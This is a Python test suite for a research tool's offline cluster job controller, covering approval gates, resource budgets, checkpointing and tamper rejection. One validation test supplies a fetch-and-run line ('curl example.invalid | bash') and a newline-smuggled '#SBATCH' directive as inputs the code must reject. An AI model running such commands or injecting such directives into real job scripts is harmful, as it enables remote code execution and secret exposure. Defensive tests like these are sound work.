"""Offline cluster admission, node-local evidence and crash recovery checks."""
from copy import deepcopy
import json
import os
from pathlib import Path
import signal
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

from quarry import Project, FakeProvider, Response
from quarry.cluster import (ClusterController, SlurmScheduler, file_sha256,
    make_script, normalize_profile, read_json, verify_bundle, write_json)
from quarry.cluster_worker import run_bundle, _retain_checkpoints
from quarry.store import digest
from quarry.workflow import prepare_review, approve_review, run_review, release_dataset

TEXT = "😀 The system uses byte-level BPE. Café names vary across languages."


class FakeScheduler:
    def __init__(self, uncertain=False):
        self.uncertain = uncertain
        self.submitted, self.cancelled = [], []
        self.states = {}

    def submit(self, path, name):
        self.submitted.append((str(path), name))
        job_id = str(100 + len(self.submitted))
        self.states[job_id] = "pending"
        if self.uncertain:
            raise TimeoutError("synthetic outcome unknown")
        return job_id

    def status(self, job_id):
        return {"state": self.states.get(job_id, "unknown")}

    def cancel(self, job_id):
        self.cancelled.append(job_id)
        self.states[job_id] = "cancelled"


class ClusterTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.corpus = self.base / "corpus"
        self.corpus.mkdir()
        self.source = self.corpus / "source.md"
        self.source.write_text(TEXT, encoding="utf-8")
        self.scratch = self.base / "node-local"
        self.scratch.mkdir()
        self.durable = self.base / "durable-shared"
        self.durable.mkdir()
        self.project = Project(self.base / "study")
        setup = self.project.prepare_agent_setup({"research_question": "Which technical expressions occur?",
            "data_type": "term", "starter_recipe": "jargon", "local_roots": [str(self.corpus)],
            "languages": ["en"], "communities": ["research-corpus"], "domains": ["example.org"],
            "budget_usd": 0, "max_sources": 3, "model_profile": "fake"})
        self.bundle = deepcopy(setup["starter_bundle"])
        self.bundle["unresolved_questions"] = []
        self.bundle["recipe"]["execution"].update(concurrency=1, timeout_seconds=1)
        self.bundle["agent"]["tool"] = "offline_cluster_test"
        self.bundle["sources"] = [{"source_key": "local-1", "kind": "local", "locator": str(self.source),
            "metadata": {"language": "en", "community": "research-corpus", "domain": "synthetic",
                "publication_date": None, "publication_date_reason": "synthetic_fixture",
                "constraints": {"content_origin": "synthetic_fixture", "license": "test-only",
                    "permitted_use": "offline_verification", "redistribution": "fixture_only"}},
            "why_selected": "Synthetic cluster verification", "origin": "researcher_supplied",
            "search_refs": [], "family_id": "fixture-family"}]
        self.review = prepare_review(self.project, self.bundle)
        approve_review(self.project, self.review["review_id"], approval_reference="Offline test research approval")
        self.profile = {"name": "offline-gt-fixture", "account": "fixture-account", "partition": "fixture-gpu",
            "gpus": 1, "cpus": 2, "memory_gb": 8, "walltime_seconds": 120,
            "checkpoint_seconds": 5, "shutdown_grace_seconds": 35, "max_submissions": 3,
            "max_gpu_hours": 0.1, "scratch_env": "TMPDIR",
            "runtime": {"python_executable": sys.executable,
                "python_sha256": file_sha256(Path(sys.executable).resolve()),
                "runtime_id": "reviewed-offline-python", "runtime_reference": "Offline installed runtime fixture"},
            "model_artifacts": [{"model_alias": alias, "checkpoint_id": "synthetic-" + alias,
                "sha256": digest("synthetic-" + alias), "quantization": None} for alias in self.project.profile["models"]],
            "configuration_reference": "Offline fixture only, never an actual GT allocation",
            "durable_root": str(self.durable)}
        self.controller = ClusterController(self.project)
        self.scheduler = FakeScheduler()

    def prepared(self):
        self.controller.configure(self.profile)
        return self.controller.prepare(self.review["review_id"])

    def submitted(self):
        prepared = self.prepared()
        job = self.controller.submit(prepared["cluster_review_id"], approval_reference="Offline human resource approval",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        return prepared, job

    def provider(self, *, delay=0, send_signal=False):
        candidate = {"expression": "byte-level BPE", "language": "en", "sense": "A tokenization method",
            "context": TEXT, "start": None, "definition_quote": None, "translation": None, "attributes": {}}
        counter = {"count": 0}
        def answer(request):
            counter["count"] += 1
            if send_signal and counter["count"] == 1:
                os.kill(os.getpid(), signal.SIGUSR1)
            if delay:
                time.sleep(delay)
            return Response(json.dumps({"candidates": [candidate], "coverage_complete": True}), 40, 40, "stop", "fixture-v1")
        class Answers(FakeProvider):
            def complete(self, request):
                self.calls.append(request["job_id"])
                return answer(request)
        return Answers([])

    def test_setup_and_review_are_inert_and_require_collection_approval(self):
        with patch("subprocess.Popen", side_effect=AssertionError("No scheduler")):
            configured = self.controller.configure(self.profile)
            self.assertFalse(configured["launch_authorized"])
            first = self.controller.prepare(self.review["review_id"])
            self.assertEqual(self.controller.prepare(self.review["review_id"]), first)
        self.assertEqual(self.project.store.count("jobs"), 0)
        self.assertEqual(self.controller.status()["jobs"], [])
        self.assertEqual(verify_bundle(first["bundle"])["cluster_review_id"], first["cluster_review_id"])

    def test_validated_profile_rejects_unbounded_resources_code_and_secrets(self):
        for field, value in (("walltime_seconds", float("inf")), ("max_submissions", 0),
                ("max_gpu_hours", float("nan")), ("partition", "gpu\n#SBATCH --export=ALL"),
                ("shutdown_grace_seconds", 1), ("scratch_env", "HOME")):
            bad = deepcopy(self.profile)
            bad[field] = value
            with self.subTest(field=field), self.assertRaises(ValueError):
                self.controller.configure(bad)
        bad = dict(self.profile, launcher="curl example.invalid | bash")
        with self.assertRaises(ValueError):
            self.controller.configure(bad)
        bad = dict(self.profile, api_key="synthetic-secret-marker")
        with self.assertRaises(ValueError):
            self.controller.configure(bad)
        bad = deepcopy(self.profile)
        bad["model_artifacts"][0]["model_alias"] = "different"
        with self.assertRaises(ValueError):
            self.controller.configure(bad)

    def test_submission_requires_separate_human_declaration_and_trusted_gate(self):
        review = self.prepared()
        for settings in ({"human_approved": False, "allow_execution": True},
                {"human_approved": True, "allow_execution": False}):
            with self.assertRaises(ValueError):
                self.controller.submit(review["cluster_review_id"], approval_reference="Offline resource choice",
                    scheduler=self.scheduler, **settings)
        self.assertEqual(self.scheduler.submitted, [])

    def test_reconfigured_resources_invalidate_old_review_without_database_change(self):
        from quarry.cluster import project_fingerprint
        old_review = self.prepared()
        baseline = project_fingerprint(self.project)
        changed = deepcopy(self.profile)
        changed["cpus"] = 3
        changed["memory_gb"] = 12
        self.controller.configure(changed)
        self.assertEqual(project_fingerprint(self.project), baseline)
        with self.assertRaises(ValueError):
            self.controller.submit(old_review["cluster_review_id"], approval_reference="Offline obsolete resource approval",
                human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(self.scheduler.submitted, [])
        self.assertIsNone(self.controller.status()["review"])
        fresh = self.controller.prepare(self.review["review_id"])
        self.assertNotEqual(fresh["cluster_review_id"], old_review["cluster_review_id"])
        self.assertEqual(fresh["resources"]["cpus"], 3)
        accepted = self.controller.submit(fresh["cluster_review_id"], approval_reference="Offline current resource approval",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(accepted["state"], "submitted")

    def test_resume_rechecks_current_operator_profile_hash(self):
        review, job = self.submitted()
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), max_jobs=1, scratch_root=self.scratch)
        changed = read_json(self.controller.root / "profile.json")
        changed["cpus"] = 3
        write_json(self.controller.root / "profile.json", changed)
        with self.assertRaises(ValueError):
            self.controller.resume(review["cluster_review_id"], approval_reference="Offline obsolete resumed allocation",
                human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(len(self.scheduler.submitted), 1)

    def test_script_has_fixed_worker_command_and_bounded_slurm_resources(self):
        review, job = self.submitted()
        script = Path(self.scheduler.submitted[0][0]).read_text()
        self.assertIn("--nodes=1", script)
        self.assertIn("--no-requeue", script)
        self.assertIn("--export=NIL", script)
        self.assertIn("quarry.cluster_worker", script)
        self.assertNotIn(TEXT, script)
        self.assertNotIn("curl", script)
        self.assertEqual(digest(script), job["script_sha256"])
        self.assertEqual(job["reserved_gpu_hours"], 1 / 30)

    def test_active_submission_survives_new_controller_and_blocks_duplicates(self):
        review, job = self.submitted()
        reopened = ClusterController(Project(self.project.path))
        self.assertEqual(reopened.status()["job"]["job_id"], job["job_id"])
        with self.assertRaises(ValueError):
            reopened.resume(review["cluster_review_id"], approval_reference="Offline resume",
                human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(len(self.scheduler.submitted), 1)

    def test_uncertain_sbatch_is_persisted_and_reconciled_without_duplicate(self):
        review = self.prepared()
        scheduler = FakeScheduler(uncertain=True)
        job = self.controller.submit(review["cluster_review_id"], approval_reference="Offline approval",
            human_approved=True, allow_execution=True, scheduler=scheduler)
        self.assertEqual(job["state"], "submission_unknown")
        with self.assertRaises(ValueError):
            self.controller.resume(review["cluster_review_id"], approval_reference="Offline resume",
                human_approved=True, allow_execution=True, scheduler=scheduler)
        resolved = self.controller.resolve_submission(job["job_id"], scheduler_job_id="101",
            reconciliation_reference="Offline scheduler history confirms fixture job", scheduler=scheduler)
        self.assertEqual(resolved["scheduler_job_id"], "101")
        self.assertEqual(len(scheduler.submitted), 1)

    def test_verified_absence_releases_reservation_but_counts_submission_attempt(self):
        self.profile.update(max_submissions=2, max_gpu_hours=1 / 30)
        review = self.prepared()
        scheduler = FakeScheduler(uncertain=True)
        job = self.controller.submit(review["cluster_review_id"], approval_reference="Offline approval",
            human_approved=True, allow_execution=True, scheduler=scheduler)
        self.controller.resolve_submission(job["job_id"], verified_absent=True,
            reconciliation_reference="Offline operator verified no allocation")
        self.assertEqual(self.controller.status()["reserved_gpu_hours"], 0)
        scheduler.uncertain = False
        self.controller.resume(review["cluster_review_id"], approval_reference="Offline approval",
            human_approved=True, allow_execution=True, scheduler=scheduler)
        self.assertEqual(len(scheduler.submitted), 2)

    def test_frozen_bundle_and_checkpoint_hash_tampering_fail_closed(self):
        review = self.prepared()
        path = Path(review["bundle"]) / "input.sqlite3"
        with path.open("ab") as stream:
            stream.write(b"tampered")
        with self.assertRaises(ValueError):
            self.controller.submit(review["cluster_review_id"], approval_reference="Offline approval",
                human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(self.scheduler.submitted, [])

    def test_full_worker_uses_frozen_source_and_import_preserves_offsets(self):
        review, job = self.submitted()
        self.source.unlink()  # Original local source no longer needed.
        answer = run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), scratch_root=self.scratch)
        self.assertEqual(answer["result"]["status"], "complete")
        self.assertEqual(self.project.store.count("terms"), 0)  # Detached inventory.
        finished = self.controller.status()["job"]
        self.assertTrue(finished["checkpoint"]["final"])
        self.assertEqual(list(self.scratch.iterdir()), [])
        imported = self.controller.import_result(job["job_id"])
        self.assertTrue(imported["imported"])
        occurrences = self.project.store.all("occurrences")
        self.assertTrue(occurrences)
        for evidence in occurrences:
            source = self.project.store.get("sources", evidence["source_id"])
            self.assertEqual(source["text"][evidence["start"]:evidence["end"]], evidence["expression"])
        self.assertEqual(self.project.store.read_setting("cluster_execution")["job_id"], job["job_id"])
        self.assertEqual(self.project.store.read_setting("cluster_accounting")["max_gpu_hours"], 0.1)
        self.assertTrue(self.controller.import_result(job["job_id"])["already_imported"])

    def test_partial_resume_uses_checkpoint_and_does_not_repeat_completed_calls(self):
        review, first = self.submitted()
        provider = self.provider()
        result = run_bundle(review["bundle"], first["job_id"], execute=True,
            provider=provider, max_jobs=1, scratch_root=self.scratch)
        self.assertEqual(result["result"]["status"], "partial")
        self.assertEqual(len(provider.calls), 1)
        second = self.controller.resume(review["cluster_review_id"], approval_reference="Offline resumed resource approval",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertIsNotNone(second["resume_checkpoint"])
        result = run_bundle(review["bundle"], second["job_id"], execute=True,
            provider=provider, scratch_root=self.scratch)
        self.assertEqual(result["result"]["status"], "complete")
        self.assertEqual(len(provider.calls), 2)
        self.controller.import_result(second["job_id"])
        self.assertEqual(self.project.store.count("terms"), 1)

    def test_partial_import_then_resume_and_second_import_preserve_completed_work(self):
        review, first = self.submitted()
        provider = self.provider()
        run_bundle(review["bundle"], first["job_id"], execute=True,
            provider=provider, max_jobs=1, scratch_root=self.scratch)
        self.controller.import_result(first["job_id"])
        self.assertEqual(self.project.store.count("terms"), 1)
        reopened = ClusterController(Project(self.project.path))
        second = reopened.resume(review["cluster_review_id"], approval_reference="Offline second resource approval",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        run_bundle(review["bundle"], second["job_id"], execute=True,
            provider=provider, scratch_root=self.scratch)
        reopened.import_result(second["job_id"])
        self.assertEqual(len(provider.calls), 2)
        self.assertEqual(self.project.store.count("terms"), 1)

    def test_import_recovers_commit_before_durable_receipt_write(self):
        review, job = self.submitted()
        provider = self.provider()
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=provider, scratch_root=self.scratch)
        with patch("quarry.cluster.write_json", side_effect=RuntimeError("synthetic receipt crash")):
            with self.assertRaises(RuntimeError):
                self.controller.import_result(job["job_id"])
        self.assertEqual(self.project.store.count("terms"), 1)
        recovered = ClusterController(Project(self.project.path)).import_result(job["job_id"])
        self.assertTrue(recovered["recovered_committed_import"])
        self.assertEqual(len(provider.calls), 2)
    def test_node_local_staging_failure_is_visible_and_issues_no_model_calls(self):
        review, job = self.submitted()
        provider = self.provider()
        with self.assertRaises(ValueError):
            run_bundle(review["bundle"], job["job_id"], execute=True,
                provider=provider, scratch_root=self.base / "does-not-exist")
        failed = self.controller.status()["job"]
        self.assertEqual(failed["state"], "failed")
        self.assertEqual(failed["reason"], "node_local_staging_failed")
        self.assertEqual(provider.calls, [])

    def test_failed_resume_staging_keeps_previous_checkpoint_for_next_allocation(self):
        review, first = self.submitted()
        provider = self.provider()
        run_bundle(review["bundle"], first["job_id"], execute=True,
            provider=provider, max_jobs=1, scratch_root=self.scratch)
        second = self.controller.resume(review["cluster_review_id"], approval_reference="Offline staging test",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        with self.assertRaises(ValueError):
            run_bundle(review["bundle"], second["job_id"], execute=True,
                provider=provider, scratch_root=self.base / "missing-scratch")
        third = self.controller.resume(review["cluster_review_id"], approval_reference="Offline repaired scratch",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(third["resume_checkpoint"], second["resume_checkpoint"])
        run_bundle(review["bundle"], third["job_id"], execute=True,
            provider=provider, scratch_root=self.scratch)
        self.controller.import_result(third["job_id"])
        self.assertEqual(len(provider.calls), 2)

    def test_checkpoint_symlink_ancestor_rejected_before_import(self):
        review, job = self.submitted()
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), scratch_root=self.scratch)
        directory = Path(review["bundle"]) / "checkpoints"
        moved = directory.with_name("moved-checkpoints")
        directory.rename(moved)
        directory.symlink_to(moved, target_is_directory=True)
        with self.assertRaises(ValueError):
            self.controller.import_result(job["job_id"])
        self.assertEqual(self.project.store.count("terms"), 0)

    def test_metadata_rejects_duplicate_keys_and_nonfinite_values(self):
        path = self.base / "invalid.json"
        for text in ('{"jobs":[],"jobs":[]}', '{"value":NaN}', '{"value":Infinity}'):
            path.write_text(text)
            with self.subTest(text=text), self.assertRaises(ValueError):
                read_json(path)

    def test_cpu_endpoint_mode_does_not_request_unused_gpus(self):
        self.profile.update(gpus=0, max_gpu_hours=0)
        review, job = self.submitted()
        script = Path(self.scheduler.submitted[0][0]).read_text()
        self.assertNotIn("#SBATCH --gpus", script)
        self.assertEqual(job["reserved_gpu_hours"], 0)
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), scratch_root=self.scratch)
        self.assertEqual(self.controller.status()["remaining_gpu_hours"], 0)
        self.assertIsNone(self.controller.status()["blocked_reason"])

    def test_slurm_acceptance_after_early_worker_completion_keeps_final_receipt(self):
        review = self.prepared()
        controller = self.controller
        provider = self.provider()
        scratch = self.scratch
        class EarlyWorker(FakeScheduler):
            def submit(self, path, name):
                result = super().submit(path, name)
                run_bundle(review["bundle"], name, execute=True, provider=provider, scratch_root=scratch)
                return result
        scheduler = EarlyWorker()
        job = controller.submit(review["cluster_review_id"], approval_reference="Offline early allocation approval",
            human_approved=True, allow_execution=True, scheduler=scheduler)
        self.assertEqual(job["state"], "completed")
        self.assertIsNotNone(job["checkpoint"])
        self.assertEqual(job["scheduler_job_id"], "101")

    def test_unknown_sbatch_after_worker_started_requires_identification(self):
        review = self.prepared()
        provider, scratch = self.provider(), self.scratch
        class EarlyUnknown(FakeScheduler):
            def submit(self, path, name):
                super().submit(path, name)
                run_bundle(review["bundle"], name, execute=True, provider=provider, scratch_root=scratch)
                raise TimeoutError("synthetic scheduler response lost")
        scheduler = EarlyUnknown()
        job = self.controller.submit(review["cluster_review_id"], approval_reference="Offline approval",
            human_approved=True, allow_execution=True, scheduler=scheduler)
        self.assertTrue(job["scheduler_submission_uncertain"])
        with self.assertRaises(ValueError):
            self.controller.resolve_submission(job["job_id"], verified_absent=True,
                reconciliation_reference="Offline invalid absence claim")
        with self.assertRaises(ValueError):
            self.controller.resume(review["cluster_review_id"], approval_reference="Offline blocked resume",
                human_approved=True, allow_execution=True, scheduler=scheduler)
        resolved = self.controller.resolve_submission(job["job_id"], scheduler_job_id="101",
            reconciliation_reference="Offline confirmed actual allocation")
        self.assertEqual(resolved["state"], "completed")
        self.assertFalse(resolved["scheduler_submission_uncertain"])

    def test_worker_signal_checkpoint_leaves_pending_work_resumable(self):
        review, first = self.submitted()
        provider = self.provider(delay=0.35, send_signal=True)
        run_bundle(review["bundle"], first["job_id"], execute=True,
            provider=provider, scratch_root=self.scratch, install_signals=True)
        saved = self.controller.status()["job"]
        self.assertEqual(saved["state"], "partial")
        self.assertEqual(saved["stop_reason"], "scheduler_signal_SIGUSR1")
        self.assertIsNotNone(saved["checkpoint"])
        second = self.controller.resume(review["cluster_review_id"], approval_reference="Offline signal resume",
            human_approved=True, allow_execution=True, scheduler=self.scheduler)
        result = run_bundle(review["bundle"], second["job_id"], execute=True,
            provider=self.provider(), scratch_root=self.scratch)
        self.assertEqual(result["result"]["status"], "complete")

    def test_origin_annotation_or_settings_changes_block_import_without_loss(self):
        review, job = self.submitted()
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), scratch_root=self.scratch)
        self.project.store.setting("researcher_note", "Preserve this human annotation")
        with self.assertRaises(ValueError):
            self.controller.import_result(job["job_id"])
        self.assertEqual(self.project.store.read_setting("researcher_note"), "Preserve this human annotation")
        self.assertEqual(self.project.store.count("terms"), 0)

    def test_budget_exhaustion_visible_and_no_automatic_requeue(self):
        self.profile.update(max_submissions=1, max_gpu_hours=1 / 30)
        review, job = self.submitted()
        run_bundle(review["bundle"], job["job_id"], execute=True,
            provider=self.provider(), max_jobs=1, scratch_root=self.scratch)
        with self.assertRaisesRegex(ValueError, "budget exhausted"):
            self.controller.resume(review["cluster_review_id"], approval_reference="Offline second allocation",
                human_approved=True, allow_execution=True, scheduler=self.scheduler)
        self.assertEqual(len(self.scheduler.submitted), 1)
        self.assertAlmostEqual(self.controller.status()["reserved_gpu_hours"], 1 / 30)
        self.assertEqual(self.controller.status()["blocked_reason"], "cluster_resource_budget_exhausted")
        self.assertEqual(self.controller.status()["last_submission_decision"]["reason"], "cluster_resource_budget_exhausted")

    def test_cancel_is_durable_and_explicit_refresh_observes_scheduler(self):
        review, job = self.submitted()
        cancelled = self.controller.cancel(job["job_id"], scheduler=self.scheduler)
        self.assertTrue(cancelled["cancel_requested"])
        self.assertEqual(self.scheduler.cancelled, [job["scheduler_job_id"]])
        status = self.controller.status(job["job_id"], scheduler=self.scheduler)
        self.assertEqual(status["job"]["state"], "cancelled")

    def test_stopped_job_exports_reproducibly_without_model_calls(self):
        review, job = self.submitted()
        provider = self.provider()
        run_bundle(review["bundle"], job["job_id"], execute=True, provider=provider, scratch_root=self.scratch)
        self.controller.import_result(job["job_id"])
        first = release_dataset(self.project, "cluster-fixture", ["jsonl", "csv"])
        files = {p.name: p.read_bytes() for p in Path(first["out"]).iterdir() if p.is_file()}
        second = release_dataset(self.project, "cluster-fixture", ["jsonl", "csv"])
        self.assertEqual(files, {p.name: p.read_bytes() for p in Path(second["out"]).iterdir() if p.is_file()})
        self.assertEqual(len(provider.calls), 2)

    def test_runtime_hash_or_worker_gate_mismatch_never_calls_provider(self):
        review, job = self.submitted()
        provider = self.provider()
        with self.assertRaises(ValueError):
            run_bundle(review["bundle"], job["job_id"], provider=provider, scratch_root=self.scratch)
        self.assertEqual(provider.calls, [])

    def test_active_batch_blocks_local_budget_bypass_before_provider_request(self):
        self.submitted()
        provider = self.provider()
        with self.assertRaises(ValueError):
            self.project.collect(provider)
        with self.assertRaises(ValueError):
            run_review(self.project, self.review["review_id"], provider=provider)
        self.assertEqual(provider.calls, [])

    def local_server_profile(self):
        old_brief = deepcopy(self.project.agent_setup()["brief"])
        self.project.configure_compute(backend="local", base_url="http://127.0.0.1:18880/v1",
            model="offline-reviewed-model", model_version="offline-model-revision",
            context_limit_tokens=8192, max_output_tokens=512)
        old_brief["model_profile"] = "configured"
        setup = self.project.prepare_agent_setup(old_brief)
        bundle = deepcopy(setup["starter_bundle"])
        bundle["unresolved_questions"] = []
        bundle["recipe"]["execution"].update(concurrency=1, timeout_seconds=1)
        bundle["agent"]["tool"] = "offline_cluster_test"
        bundle["sources"] = deepcopy(self.bundle["sources"])
        self.review = prepare_review(self.project, bundle)
        approve_review(self.project, self.review["review_id"], approval_reference="Offline local-model research approval")
        directory = self.base / "reviewed-local-model"
        directory.mkdir()
        payload = {"config.json": b'{"model_type":"synthetic"}', "tokenizer.json": b"{}",
            "model.safetensors": b"Synthetic fixture; never load as actual weights"}
        for name, data in payload.items():
            (directory / name).write_bytes(data)
        inventory = {name: file_sha256(directory / name) for name in payload}
        self.profile["server"] = {"adapter": "vllm", "model_alias": "researcher",
            "local_model_dir": str(directory), "artifact_files": inventory, "port": 18880,
            "startup_timeout_seconds": 5, "max_model_len": 8192, "tensor_parallel_size": 1,
            "gpu_memory_utilization": 0.8, "package_version": "0.11.0"}
        self.profile["model_artifacts"] = [{"model_alias": "researcher", "checkpoint_id": "offline-model-revision",
            "sha256": digest(inventory), "quantization": None}]
        self.controller.configure(self.profile)
        review = self.controller.prepare(self.review["review_id"])
        job = self.controller.submit(review["cluster_review_id"], approval_reference="Offline GPU resource approval",
            human_approved=True, allow_execution=True, allow_paid=True, scheduler=self.scheduler)
        return review, job

    def test_owned_warm_server_lifecycle_runs_once_and_records_actual_artifacts(self):
        review, job = self.local_server_profile()
        calls = []
        class Server:
            def __init__(self, profile, extractor):
                calls.append("construct")
            def start(self):
                calls.append("start")
                return {"adapter": "vllm", "model_alias": "researcher", "package_version": "0.11.0",
                    "simulation": True, "model_artifact_files": deepcopy(self_profile["server"]["artifact_files"])}
            def close(self):
                calls.append("close")
        self_profile = self.profile
        provider = self.provider()
        run_bundle(review["bundle"], job["job_id"], execute=True, provider=provider,
            scratch_root=self.scratch, serving_factory=Server)
        self.assertEqual(calls, ["construct", "start", "close"])
        self.assertEqual(len(provider.calls), 1)
        self.controller.import_result(job["job_id"])
        recorded = self.project.store.read_setting("cluster_execution")
        self.assertEqual(recorded["server"]["model_artifact_files"], self.profile["server"]["artifact_files"])
        self.assertEqual(recorded["model_artifacts"][0]["sha256"], digest(self.profile["server"]["artifact_files"]))

    def test_owned_server_startup_failure_checkpoint_and_cleanup_are_visible(self):
        review, job = self.local_server_profile()
        calls = []
        class Server:
            def __init__(self, profile, extractor): pass
            def start(self): raise RuntimeError("Synthetic startup failure; no real model")
            def close(self): calls.append("close")
        provider = self.provider()
        with self.assertRaises(RuntimeError):
            run_bundle(review["bundle"], job["job_id"], execute=True,
                provider=provider, scratch_root=self.scratch, serving_factory=Server)
        failed = self.controller.status()["job"]
        self.assertEqual(failed["state"], "failed")
        self.assertIsNotNone(failed["checkpoint"])
        self.assertEqual(provider.calls, [])
        self.assertEqual(calls, ["close"])

    def test_missing_durable_state_does_not_reopen_local_budget(self):
        self.submitted()
        (self.controller.root / "state.json").unlink()
        provider = self.provider()
        with self.assertRaises(ValueError):
            self.project.collect(provider)
        self.assertEqual(provider.calls, [])

    def test_scheduler_cli_uses_fixed_arguments_selected_environment_and_safe_output(self):
        calls = []
        class Process:
            returncode = 0
            pid = 999999
            def wait(self, timeout=None): return 0
        def process(argv, **settings):
            calls.append((argv, settings))
            settings["stdout"].write(b"12345;fixture-cluster\n")
            return Process()
        with patch("quarry.cluster.shutil.which", return_value="/bin/sh"), \
                patch("quarry.cluster.subprocess.Popen", side_effect=process), \
                patch.dict("os.environ", {"INSTITUTION_MODEL_TOKEN": "synthetic-required-marker", "UNRELATED_TOKEN": "synthetic-unrelated-marker"}, clear=True):
            scheduler = SlurmScheduler(credential_names=["INSTITUTION_MODEL_TOKEN"])
            receipt = scheduler.submit(self.base / "reviewed.sbatch", "cluster_job_" + "a" * 32)
        self.assertEqual(receipt, "12345")
        argv, settings = calls[0]
        self.assertIn("--parsable", argv)
        self.assertNotIn("synthetic-required-marker", " ".join(argv))
        self.assertEqual(settings["env"]["INSTITUTION_MODEL_TOKEN"], "synthetic-required-marker")
        self.assertNotIn("UNRELATED_TOKEN", settings["env"])
        self.assertTrue(settings["start_new_session"])
        self.assertTrue(callable(settings["preexec_fn"]))

    def test_scheduler_cli_oversized_or_nonidentifier_output_is_uncertain_without_echo(self):
        class Process:
            returncode = 0
            def wait(self, timeout=None): return 0
        for output in (b"synthetic-private-output", b"x" * 65_537):
            def process(argv, **settings):
                settings["stdout"].write(output)
                return Process()
            with patch("quarry.cluster.shutil.which", return_value="/bin/sh"), \
                    patch("quarry.cluster.subprocess.Popen", side_effect=process):
                with self.assertRaises(RuntimeError) as error:
                    SlurmScheduler().submit(self.base / "reviewed.sbatch", "cluster_job_" + "a" * 32)
            self.assertNotIn("synthetic-private-output", str(error.exception))

    def test_periodic_checkpoint_retention_is_bounded_and_preserves_job_references(self):
        review = self.prepared()
        bundle = Path(review["bundle"])
        directory = bundle / "checkpoints"
        directory.mkdir()
        input_hash = file_sha256(bundle / "input.sqlite3")
        # Another allocation's unreferenced generation must remain untouched.
        foreign = directory / ("checkpoint_" + "f" * 32 + ".sqlite3")
        foreign.write_bytes(b"Other allocation generation")
        owned, state = [], {"jobs": [{"checkpoint": None, "resume_checkpoint": None}]}
        references = []
        for index in range(1, 51):
            relative = "checkpoints/checkpoint_" + format(index, "032x") + ".sqlite3"
            (bundle / relative).write_bytes(b"Synthetic periodic SQLite generation")
            owned.append(relative)
            if index <= 2:
                references.append(relative)
                state["jobs"][0]["checkpoint" if index == 1 else "resume_checkpoint"] = {"file": relative}
            owned = _retain_checkpoints(bundle, state, owned)
            self.assertLessEqual(len(owned), 4)
        present = {path.relative_to(bundle).as_posix() for path in directory.iterdir()}
        self.assertEqual(present, set(references + owned[-2:] + [foreign.relative_to(bundle).as_posix()]))
        self.assertEqual(file_sha256(bundle / "input.sqlite3"), input_hash)
        self.assertEqual(verify_bundle(bundle)["cluster_review_id"], review["cluster_review_id"])

    def test_checkpoint_retention_keeps_previous_and_never_follows_directory_links(self):
        directory = self.base / "retention-bundle" / "checkpoints"
        directory.mkdir(parents=True)
        owned = ["checkpoints/checkpoint_" + format(i, "032x") + ".sqlite3" for i in range(3)]
        for relative in owned:
            (directory.parent / relative).write_bytes(b"Synthetic checkpoint")
        retained = _retain_checkpoints(directory.parent, {"jobs": []}, owned)
        self.assertEqual(retained, owned[-2:])
        moved = directory.with_name("moved-checkpoints")
        directory.rename(moved)
        directory.symlink_to(moved, target_is_directory=True)
        with self.assertRaises(ValueError):
            _retain_checkpoints(directory.parent, {"jobs": []}, owned)
        self.assertEqual(len(list(moved.iterdir())), 2)

    def test_checkpoint_failure_stops_monitor_instead_of_repeating_full_backups(self):
        from quarry.store import Store
        review, job = self.submitted()
        original_backup, original_monotonic = Store.backup, time.monotonic
        attempts = []
        class Clock:
            @staticmethod
            def monotonic():
                offset = 6 if threading.current_thread().name == "quarry-cluster-checkpoint" else 0
                return original_monotonic() + offset
        def backup(store, target):
            attempts.append(str(target))
            if len(attempts) == 1:
                return original_backup(store, target)
            raise OSError("Synthetic durable checkpoint failure")
        with patch("quarry.cluster_worker.time", Clock), patch.object(Store, "backup", backup):
            with self.assertRaises(OSError):
                run_bundle(review["bundle"], job["job_id"], execute=True,
                    provider=self.provider(delay=0.8), scratch_root=self.scratch)
        # Initial backup, one monitor failure, final attempt and recovery
        # attempt. No backup is repeated on subsequent 0.2-second ticks.
        self.assertLessEqual(len(attempts), 4)
        self.assertEqual(self.controller.status()["job"]["state"], "failed")
        self.assertIsNotNone(self.controller.status()["job"]["checkpoint"])


if __name__ == "__main__":
    unittest.main()
